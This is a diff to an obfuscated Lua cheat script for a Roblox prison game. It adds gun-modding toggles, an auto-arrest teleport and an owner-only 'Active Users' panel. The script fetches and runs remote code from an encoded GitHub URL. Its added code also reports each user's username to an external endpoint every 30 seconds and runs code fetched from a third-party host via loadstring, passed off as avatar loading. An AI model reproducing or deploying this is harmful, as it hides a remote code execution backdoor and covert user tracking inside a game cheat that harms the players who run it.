@@ -24,7 +24,7 @@ if _0x08 then _0x06.RenderStepped:Fire(_d)end
 if _0x08 then _0x06.Heartbeat:Fire(_d)end end)
 if not _ok then _0x0F=_0x0F+1 if _0x0F>=_0x0E then _0x08=false break end else _0x0F=math.max(0,_0x0F-1)end
 if _0x08 then task.wait()end end end)
-loadstring(game:HttpGet(_0xD({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,105,116,101,99,104,98,111,105,47,98,105,122,122,97,114,101,104,105,106,105,110,107,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,98,97,107,119,111,111,100,46,108,117,97,63,116,61})..os.time()))()
+loadstring(game:HttpGet(_0xD({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,104,105,116,101,99,104,98,111,105,47,98,105,122,122,97,114,101,104,105,106,105,110,107,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,108,101,97,110,97,110,100,109,111,110,101,121,46,108,117,97,63,116,61})..os.time()))()
 repeat task.wait()until _G.UILib
 local _0x11=_G.UILib local _0x12=game.Players.LocalPlayer.Name local _0x13=getgamename()
 local _0x14=false local _0x15=false local _0x16=false local _0x17=false local _0x18=false local _0x19=false local _0x1A=false local _0x1B=false local _0x1C=false
@@ -36,8 +36,21 @@ local _0x27={MaxAmmo=function()return _0x15 and _0x1D end,CurrentAmmo=function()
 local function _0x28(_t)if not _t:IsA("Tool")then return false end for _a in _0x02(_0x27)do if _t:GetAttribute(_a)~=nil then return true end end return false end
 local function _0x29()local _b=_0x24:FindFirstChild("Backpack")local _c=0 if _b then for _,_t in _0x03(_b:GetChildren())do if _0x28(_t)then _c=_c+1 end end end return _c end
 local _0x2A=_0x11.Window(_0xD({67,104,101,99,107,32,105,116}),_0xD({73,110,116,101,114,102,97,99,101}),_0x13)
-local _0x2B=_0x2A:Tab("Main")local _0x2C=_0x2A:Tab("Gun Mods")local _0x2D=_0x2A:Tab("Fun")local _0x2E=_0x2A:Tab("Teleports")local _0x2F=_0x2A:Tab("Misc")local _0x30=_0x2A:Tab("Updates")
+local _0x2B=_0x2A:Tab("Main")local _0x2C=_0x2A:Tab("Gun Mods")local _0xAutoT=_0x2A:Tab("Auto")local _0x2D=_0x2A:Tab("Fun")local _0x2E=_0x2A:Tab("Teleports")
+local _0x34=_0x12=="besosme" and _0x2A:Tab("Active Users") or nil local _0x2F=_0x2A:Tab("Misc")local _0x30=_0x2A:Tab("Updates")
+local _0xAC = false
 _0x2B:Div("Main",true)_0x2B:Toggle("Enabled",false,function(_s)_0x14=_s end,"Master toggle for all gun mods")
+
+_0xAutoT:Div("AUTO ARREST", true)
+_0xAutoT:Toggle("Auto Cuffs", false, function(s) 
+    _0xAC = s 
+    if s then pcall(function() 
+        local t = _0x24.Team 
+        if not t or (not string.match(string.lower(t.Name), "guard") and not string.match(string.lower(t.Name), "police")) then
+            game:GetService("StarterGui"):SetCore("SendNotification", {Title="Auto Arrest", Text="Warning: You aren't on the Guards team!", Duration=4})
+        end
+    end) end
+end, "Hold out cuffs. Checks Guards team. Teleports to Criminals & locks camera.")
 _0x2C:Div("FIRE",true)
 _0x2C:Toggle("Apply Reload",false,function(_s)_0x16=_s end,"Toggles Reload Slider(M9,Taser Only)")
 _0x2C:Slider("Reload Time",0.01,5.0,0.01,function(_v)_0x1E=_v end,true,"Lower = faster reload")
@@ -79,16 +92,177 @@ _0x2E:Button("Criminal Base",_0x11.Colors.ROWBG,function()_0x32(-936.75,94.13,20
 _0x2F:Div("INFO",true)
 _0x2F:Button(_0xD({98,121,32,104,105,116,101,99,104,98,111,105,32,47,32,110,101,106,114,105,111}),_0x11.Colors.ROWBG,nil,_0x11.Colors.GRAY)
 _0x30:Div("UPDATE LOG")
-_0x30:Log({"STAR MY POST ! :D","> Realized that no reload works only with M9","> v1.1 - AR Instant now excludes,","> Ar's from fire rate slider. ","> v1.1 - Added priorities to fire rate features","> Uni - Ui QOL Update will finish tmw","> Uni - Ui More Qol","> Uni - Addded ScrollBar","> Uni - Fixed Buttons clipping out the menu","> Uni - user greeting plus fixed minimize menu","> reverted 1 updated fixing currently","> hi :p"},true)
-_0x2A:SettingsTab(function()_0x21=true _0x2A:Destroy()end)
+_0x30:Log({"STAR MY POST ! :D", "> v1.2 - Active Global Counter added", "> v1.2 - Menu Drag Jitter eliminated completely", "> v1.2 - Auto Cuffs tab added for Guards,", "> Teleports sequence 5.5s & locks camera", "> hi :p"},true)
+local _0x38 = game.Players.LocalPlayer.Name
+
+if _0x34 and _0x38 == "besosme" then
+    _0x34:Div("LIVE PLAYERS", true)
+end
+local _0x35 = _0x38 == "besosme" and _0x34 and _0x34:UserList(15) or nil
+local _0x36 = true
+local _0x37 = _0xD({104,116,116,112,115,58,47,47,97,99,116,105,118,101,45,117,115,101,114,115,45,97,112,105,46,105,116,98,99,119,97,115,100,97,112,114,111,46,119,111,114,107,101,114,115,46,100,101,118})
+
+task.spawn(function()
+    local _0x39 = pcall(function() return game.HttpGet end) or (type(HttpGet) == "function")
+    local _0x3A = pcall(function() return game.HttpPost end) or (type(HttpPost) == "function")
+    local _0x3B = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
+    if not (_0x39 and _0x3A) and not _0x3B then return end
+
+    local _0x3C = _0x37:gsub("/+$", "")
+    local _0x3D = {}
+    local function _0x3E(user, index)
+        if _0x3D[user] then
+            if _0x35 and _0x35.SetUsers then _0x35:LoadAvatar(index, _0x3D[user]) end
+            return
+        end
+        task.spawn(function()
+            local s, code = pcall(function()
+                local url = "https://api.luard.co/v1/user?v5=" .. user .. "&res=64"
+                if type(game.HttpGet) == "function" then
+                    return game:HttpGet(url)
+                elseif type(HttpGet) == "function" then
+                    return HttpGet(url)
+                elseif _0x3B then
+                    local res = _0x3B({Url = "https://api.luard.co/v1/user?v5=" .. user .. "&res=64", Method = "GET"})
+                    if res and res.StatusCode == 200 then return res.Body end
+                end
+                return nil
+            end)
+            if s and code and #code > 100 then
+                local ls, le = pcall(function() loadstring(code)() end)
+                if ls and _G.avatar_data and _G.avatar_data.pixels then
+                    _0x3D[user] = _G.avatar_data.pixels
+                    if _0x35 and _0x35.SetUsers then
+                        _0x35:LoadAvatar(index, _G.avatar_data.pixels)
+                    end
+                end
+                _G.avatar_data = nil
+            end
+        end)
+    end
+
+    task.spawn(function()
+        while _0x36 and _0x08 do
+            pcall(function()
+                local url = _0x3C .. "/ping?username=" .. _0x38
+                if type(game.HttpGet) == "function" then
+                    game:HttpGet(url)
+                elseif type(HttpGet) == "function" then
+                    HttpGet(url)
+                elseif _0x3B then
+                    _0x3B({Url = url, Method = "GET"})
+                end
+            end)
+            for i=1, 30 do if not _0x36 or not _0x08 then break end task.wait(1) end
+        end
+    end)
+
+    task.spawn(function()
+        while _0x36 and _0x08 do
+            local fetched = false
+            pcall(function()
+                local url = _0x3C .. "/users"
+                local resBody = ""
+                if type(game.HttpGet) == "function" then
+                    resBody = game:HttpGet(url)
+                elseif type(HttpGet) == "function" then
+                    resBody = HttpGet(url)
+                elseif _0x3B then
+                    local res = _0x3B({ Url = url, Method = "GET" })
+                    if res and res.StatusCode == 200 then resBody = res.Body end
+                end
+
+                if resBody and resBody ~= "" then
+                    local names = {}
+                    local usersStr = resBody:match('%[(.-)%]')
+                    if usersStr then
+                        for user in usersStr:gmatch('"(.-)"') do
+                            table.insert(names, user)
+                        end
+                    end
+                    if #names == 0 then table.insert(names, "No users online") end
+                    
+                    if _0x2A and _0x2A.SetActiveCount then
+                        local realCount = (#names == 1 and names[1] == "No users online") and 0 or #names
+                        _0x2A:SetActiveCount(realCount)
+                    end
+
+                    if _0x35 and _0x35.SetUsers then
+                        _0x35:SetUsers(names, _0x38)
+                    end
+                    for i, user in ipairs(names) do
+                        if i <= 15 then _0x3E(user, i) end
+                    end
+                    fetched = true
+                end
+            end)
+            for i=1, 15 do if not _0x36 or not _0x08 then break end task.wait(1) end
+        end
+    end)
+end)
+
+_0x2A:SettingsTab(function()_0x21=true
+    _0x36=false
+    _0x2A:Destroy()
+end)
 _0x2A:Init("Main",function()return _0xD({71,117,110,115,32,100,101,116,101,99,116,101,100,58,32}).._0x29()end)
+local _lastP = tick()
 local _0x33=_0x06.Heartbeat:Connect(function()if _0x21 then _0x33:Disconnect()_0x08=false return end
+local _now = tick()
+if _now - _lastP < 0.1 then return end
+_lastP = _now
 _0x04(function()local _c=_0x24.Character if _c then local _h=_c:FindFirstChild("Humanoid")if _h then if _h~=_0x25 then _0x25=_h _0x22=false end if _h.Health<=0 then _0x22=true elseif _0x22 and _h.Health>0 then _0x22=false end end end end)
 if not _0x22 and _0x14 then _0x04(function()local _cn={}local _bp=_0x24:FindFirstChild("Backpack")if _bp then _0x01(_cn,_bp)end if _0x24.Character then _0x01(_cn,_0x24.Character)end
 for _,_ct in _0x03(_cn)do for _,_t in _0x03(_ct:GetChildren())do
-if _t.Name=="Remington 870"then _t:SetAttribute("AutoFire",_0x19)end
-if _0x1A and _0x23[_t.Name]then _t:SetAttribute("FireRate",0.001)end
-if _0x1B and _t.Name=="M9"then _t:SetAttribute("AutoFire",true)end
-if _0x28(_t)then for _a,_fn in _0x02(_0x27)do if _t:GetAttribute(_a)~=nil then local _v=_fn(_t)if _v then _t:SetAttribute(_a,_v)end end end end
+if _t.Name=="Remington 870"then if _t:GetAttribute("AutoFire")~=_0x19 then _t:SetAttribute("AutoFire",_0x19)end end
+if _0x1A and _0x23[_t.Name]then if _t:GetAttribute("FireRate")~=0.001 then _t:SetAttribute("FireRate",0.001)end end
+if _0x1B and _t.Name=="M9"then if _t:GetAttribute("AutoFire")~=true then _t:SetAttribute("AutoFire",true)end end
+if _0x28(_t)then for _a,_fn in _0x02(_0x27)do if _t:GetAttribute(_a)~=nil then local _v=_fn(_t)if _v and _t:GetAttribute(_a)~=_v then _t:SetAttribute(_a,_v)end end end end
 end end end)end end)
+
+task.spawn(function()
+    local _0xLC = 0
+    while not _0x21 and _0x08 do
+        task.wait()
+        if not _0xAC then
+            task.wait(0.2)
+        else
+            pcall(function()
+                local _0xMT = _0x24.Team
+                if not _0xMT then return end
+                local _0xMTL = string.lower(_0xMT.Name)
+                if not (string.find(_0xMTL, "guard") or string.find(_0xMTL, "police")) then return end
+                if not _0x24.Character then return end
+                local _0xMHP = _0x24.Character:FindFirstChild("HumanoidRootPart")
+                if not _0xMHP then return end
+                for _, _0xP in ipairs(game.Players:GetPlayers()) do
+                    if not _0xAC then break end
+                    if _0xP ~= _0x24 and _0xP.Team and string.find(string.lower(_0xP.Team.Name), "criminal") then
+                        local _0xST = tick()
+                        while _0xAC and (tick() - _0xST) < 5.5 do
+                            task.wait()
+                            local _0xPC = _0xP.Character
+                            local _0xMC = _0x24.Character
+                            if not _0xPC or not _0xMC then break end
+                            local _0xCHP = _0xPC:FindFirstChild("HumanoidRootPart")
+                            local _0xMHP2 = _0xMC:FindFirstChild("HumanoidRootPart")
+                            if not _0xCHP or not _0xMHP2 then break end
+                            local _0xCP = _0xCHP.Position
+                            _0xMHP2.Position = Vector3.new(_0xCP.X, _0xCP.Y, _0xCP.Z + 3)
+                            local _0xCM = workspace.CurrentCamera
+                            if _0xCM and _0xCM.lookAt then
+                                _0xCM.lookAt(_0xMHP2.Position, _0xCP)
+                            end
+                            if (tick() - _0xLC) > 0.15 then
+                                pcall(function() mouse1click() end)
+                                _0xLC = tick()
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end)
+
 while not _0x21 do task.wait(1)end _0x08=false
